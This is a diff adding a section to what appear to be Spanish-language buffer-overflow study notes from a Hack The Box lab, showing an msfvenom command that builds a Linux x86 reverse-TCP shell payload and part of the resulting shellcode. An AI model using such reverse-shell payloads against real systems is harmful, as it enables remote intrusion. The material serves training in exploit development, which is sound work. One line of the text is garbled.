@@ -446,6 +446,26 @@ Este proceso debe repetirse hasta eliminar todos los caracteres que podrían int
 
 ## Generating Shellcode
 
+#### MSFvenom Syntax
+
+```shell-session
+0xRh4ps00dy@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
+```
+
+#### Shellcode
+
+  ellcode
+
+```shell-session
+0xRh4ps00dy@htb[/htb]$ cat shellcode
+
+unsigned char buf[] = 
+"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
+"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
+"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
+<SNIP>
+```
+
 
 
 ## Generating Shell
